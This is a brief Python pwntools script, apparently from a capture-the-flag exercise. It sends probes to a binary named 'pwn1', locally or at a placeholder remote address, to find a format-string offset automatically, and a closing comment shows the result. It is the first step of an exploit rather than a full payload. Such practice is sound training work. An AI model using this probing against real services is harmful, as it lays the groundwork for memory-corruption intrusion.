#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level='debug'
context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
elfFileName = "pwn1"
libcFileName = ""
ip = "0.0.0.0"
port = 10001
#xaabb%8$p
Debug = 1
if Debug:
    io = process(elfFileName)
else:
    io = remote(ip,port)

# calculate the offset
def exec_fmt(payload):
	io.recvuntil("\nPlease tell me:")
	io.sendline(payload)
	info = io.recvuntil("\n")
	return info


auto = FmtStr(exec_fmt)
offset = auto.offset
print "offset is "+ str(offset)

io.interactive()

'''
[*] Found format string offset: 7
offset is 7
'''